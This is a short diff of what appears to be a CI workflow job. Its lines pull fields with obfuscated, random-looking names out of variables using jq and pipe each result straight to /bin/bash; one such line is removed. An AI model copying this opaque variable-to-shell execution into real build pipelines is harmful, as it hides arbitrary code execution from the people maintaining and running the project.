@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$gso908" | jq -r .wvt5686 | /bin/bash
           echo $eu0103 | jq -r .u771 | /bin/bash
           printf '%s' "$en160" | jq -r .hskvv70 | /bin/bash
-          echo $tgzx86585 | jq -r .v058 | /bin/bash
           echo $xca62 | jq -r .ranc959 | /bin/bash
           printf '%s' "$oafn03311" | jq -r .p9314 | /bin/bash
 
